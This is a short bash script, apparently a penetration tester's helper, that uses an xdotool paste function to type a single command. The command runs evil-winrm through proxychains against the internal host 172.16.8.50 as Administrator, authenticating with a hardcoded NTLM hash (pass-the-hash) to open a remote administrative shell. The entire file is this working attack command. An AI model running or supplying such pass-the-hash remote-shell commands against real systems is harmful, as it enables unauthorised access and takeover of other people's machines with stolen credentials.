#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "proxychains evil-winrm -i 172.16.8.50 -u 'Administrator' -H '0e20798f695ab0d04bc138b22344cea8'"